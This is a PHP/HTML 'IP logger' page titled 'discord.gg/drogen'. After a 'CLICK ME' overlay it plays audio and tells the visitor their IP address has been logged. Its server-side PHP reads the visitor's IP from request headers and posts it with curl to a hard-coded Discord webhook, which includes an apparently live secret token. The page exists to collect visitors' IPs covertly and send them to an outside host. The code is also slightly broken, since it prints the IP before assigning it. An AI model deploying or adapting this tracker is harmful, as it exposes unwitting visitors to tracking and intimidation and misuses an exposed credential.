<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/drogen</title>
    <style>
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
            100% { transform: translateY(0px); }
        }

        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
            background-color: rgba(0, 0, 0, 0.3); 
            backdrop-filter: blur(5px);
            font-family: 'Courier New', monospace;
            color: white; 
        }

        #entrance {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.85); 
            z-index: 1000;
        }

        #clickMe {
            font-size: 3em;
            padding: 20px 40px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 15px;
            cursor: pointer;
            animation: float 3s ease-in-out infinite;
            background: rgba(0, 0, 0, 0.5);
            transition: transform 0.3s;
            color: white; 
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
        }

        #clickMe:hover {
            transform: scale(1.1);
        }

        #mainContent {
            display: none;
        }

        #ipDisplay {
            font-size: 4.5em;
            font-weight: bold;
            margin-bottom: 20px;
            animation: float 3s ease-in-out infinite;
            letter-spacing: 3px;
            color: white; 
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
        }

        .subtitle {
            font-size: 2em;
            font-weight: bold;
            letter-spacing: 2px;
            text-transform: uppercase;
            padding: 15px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
            color: white; 
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
        }

        #audioPlayer {
            margin-top: 30px;
            font-size: 1.5em;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
            color: white;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(0, 0, 0, 0.15) 0%, rgba(0, 0, 0, 0.05) 100%);
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>
    <div id="entrance">
        <div id="clickMe">CLICK ME</div>
    </div>
    
    <div id="mainContent">
        <p id="ipDisplay"><?php echo htmlspecialchars($user_ip); ?></p>
        <p class="subtitle">Your IP address has been logged</p>

        <div id="audioPlayer">
            <audio id="audio" loop>
                <source src="https://cdn.discordapp.com/attachments/1151144288483283016/1331247379873267722/video0_4.mp3" type="audio/mpeg">
                Your browser does not support the audio element.
            </audio>
        </div>
    </div>

    <script>
        const entrance = document.getElementById('entrance');
        const mainContent = document.getElementById('mainContent');
        const clickMe = document.getElementById('clickMe');
        const audio = document.getElementById('audio');
        
        function startExperience() {
            entrance.style.display = 'none';
            mainContent.style.display = 'block';
            tryPlayAudio();
            document.body.style.backgroundImage = "linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://cdn.discordapp.com/attachments/1151144288483283016/1331247474635046912/video0_4.gif')";
        }

        clickMe.addEventListener('click', startExperience);

        function tryPlayAudio() {
            audio.play().catch(function(error) {
                console.error("Audio autoplay failed:", error);
            });
        }
    </script>

    <?php
    // Determine the user's IP address
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        // Cloudflare header for real IP
        $user_ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check for forwarded IP (load balancers, proxies)
        $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        // Default to remote address
        $user_ip = $_SERVER['REMOTE_ADDR'];
    }

    // PHP Code to Send IP to Discord Webhook
    $webhook_url = 'https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h';
    $payload = json_encode([
        'content' => "IP Address: $user_ip",
        'username' => 'IP Loggerchat',
        'avatar_url' => 'https://example.com/avatar.png',
    ]);

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

    $response = curl_exec($ch);
    curl_close($ch);
    ?>
</body>
</html>
